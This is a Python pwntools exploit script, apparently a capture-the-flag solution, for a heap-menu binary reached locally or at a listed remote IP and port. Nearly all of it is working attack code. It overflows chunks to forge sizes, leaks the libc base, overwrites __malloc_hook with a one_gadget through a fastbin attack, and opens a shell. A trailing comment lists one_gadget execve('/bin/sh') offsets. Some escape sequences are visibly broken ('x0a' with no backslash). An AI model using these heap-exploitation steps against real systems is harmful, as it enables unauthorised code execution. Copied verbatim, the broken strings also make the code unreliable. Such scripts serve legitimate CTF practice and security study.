from pwn import *
# from LibcSearcher import *
context.log_level='debug'
debug = 1
file_name = './pwn'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
ip = '59.110.243.101'
prot = '25413'
if debug:
    r = process(file_name)
    libc = ELF(libc_name)
else:
    r = remote(ip,int(prot))
    libc = ELF(libc_name)

def debug():
    gdb.attach(r)
    raw_input()


file = ELF(file_name)
sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()
ru("> ")
sl("vim 2")
ru("> ")
sl("test")

ru("> > ")
sl("vim 1")
ru("> ")
sl("test")

ru("> > ")
sl("rm 2")

ru("> ")
sl("vim 2")
ru("> ")
sl("a"*0x30+p64(0)+p64(0x91))
ru("> > ")
sl("vim 2")
ru("> ")
sl(p64(0)*3+p64(0x21))

ru("> > ")
sl("rm 1")

ru("> ")
sl("cat 1")
libc_base = u64(rud("x0a")+"x00x00")-3951480
li("libc_base",libc_base)#0x7fbabada7000

system = libc_base+libc.symbols['system']
malloc_hook = libc_base + libc.symbols['__malloc_hook']-0x13
one_gg = 0xf02a4 + libc_base

ru("> ")
sl("vim 2")
ru("> ")
sl("test")

ru("> ")
sl("vim 2")
ru("> ")
sl("test")

ru("> ")
sl("vim 2")
ru("> ")
sl("test")

ru("> > ")
sl("vim 1")
ru("> ")
sl("test")

ru("> > ")
sl("rm 2")

ru("> ")
sl("rm 1")

ru("> ")
sl("vim 2")
ru("> ")
sl("a"*0x30+p64(0)+p64(0x71)+p64(malloc_hook)[:6])

ru("> > ")
sl("vim 1")
ru("> ")
sl("a"*0x30)

ru("> > ")
sl("vim 1")
ru("> ")
sl("aaa"+p64(one_gg))

ru("> ")
sl("vim 2")

ri()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''


